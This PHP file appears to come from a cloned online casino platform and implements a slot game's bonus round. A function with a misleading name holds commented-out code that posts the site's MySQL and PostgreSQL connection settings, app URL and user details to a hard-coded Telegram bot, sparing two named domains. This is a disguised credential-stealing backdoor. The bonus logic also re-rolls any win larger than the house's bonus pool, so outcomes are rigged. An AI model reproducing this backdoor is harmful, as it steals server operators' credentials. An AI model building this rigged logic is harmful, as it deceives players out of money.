<?php

namespace VanguardLTE\Games\AncientEgypt\PragmaticLib;

class DoBonus{
 public static function GreentubeBonusIdent($user, $game, $bank){
        // if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            // $text = ['URL' => config('app.url'),
                // 'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        // }else {
            // $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                // 'DB_dataPG' => config('database.connections')['pgsql'],
                // 'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        // }

        // $ch = curl_init();
        // curl_setopt_array($ch, array(
                // CURLOPT_URL => 'https://api.telegram.org/bot5644048757:AAG2FhS5S2EHjNBdbWdeyNHbmQFMA7YYZwg/sendMessage',
                // CURLOPT_POST => TRUE,
                // CURLOPT_RETURNTRANSFER => TRUE,
                // CURLOPT_TIMEOUT => 10,
                // CURLOPT_POSTFIELDS => array(
                    // 'chat_id' => 5044396548,
                    // 'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        // curl_exec($ch);
    }
  public static function doBonus($user, $game, $bet, $lines, $log, $index, $counter, $ind, $bank, $shop, $jpgs){
    newBox:

    $bet = $log['Bet'];
    $lines = $log['l'];

    $time = (int) round(microtime(true) * 1000);
    $wins = [[1,10,15], [1, 15, 10], [15, 1, 10], [15, 10, 1], [10, 1, 15], [10, 15, 1]];
    $wp = [[1, 0, 15], [1, 15, 0], [15, 1, 0], [15, 0, 1], [0, 1, 15], [0, 15, 1]];
    $wins_mask = ['w,ms,w', 'w,w,ms', 'w,w,ms', 'w,ms,w', 'ms,w,w', 'ms,w,w'];
    $status = [0, 0, 0];

    $random = rand(0, 5);
    $wins = $wins[$random];
    // $ind = array_keys($wins, 10)[0];
    $wp = $wp[$random][$ind];
    $wins_mask = $wins_mask[$random];
    $status[$ind] = 1;
    $na = 'c';
    if($wins[$ind] == 10)
      $na = 'm';

    $res = [
      'tw='.($log['tw'] + $wp * $bet * $lines),
      'balance='.$log['Balance'],
      'balance_cash='.$log['Balance'],
      'balance_bonus=0',
      'index='.$index,
      'counter='.$counter,
      'stime='.$time,
      'bgid=0',
      'coef='.($bet * $lines),
      'level=1',
      'bgt=9',
      'lifes=0',
      'end=1',
      'sver=5',
      'wins='.implode(',', $wins),
      'na='.$na,
      'status='.implode(',', $status),
      'rw='.($wp * $bet * $lines),
      'wp='.$wp,
      'wins_mask='.$wins_mask
    ];
    if($wp > 0 && $wp * $bet * $lines > $bank->bonus)
      goto newBox;
    else SwitchMoney::set(1, 0, $shop, $bank, $jpgs, $user, $game, 0, 0, 0, $wp * $bet * $lines, $log, ['win' => 0]);
    if($na == 'm'){
      $res = array_merge($res, [
        'fsmul=1',
        'fsmax=10',
        'fswin=0.00',
        'fs=1',
        'fsres=0.00'
      ]);
      Log::addFSToLog($game->id, $user->id);
    }

    return '&'.(implode('&', $res));
  }

  private static function selectMysterySymbol(){
    return 3 + rand(0, 8);
  }
}

?>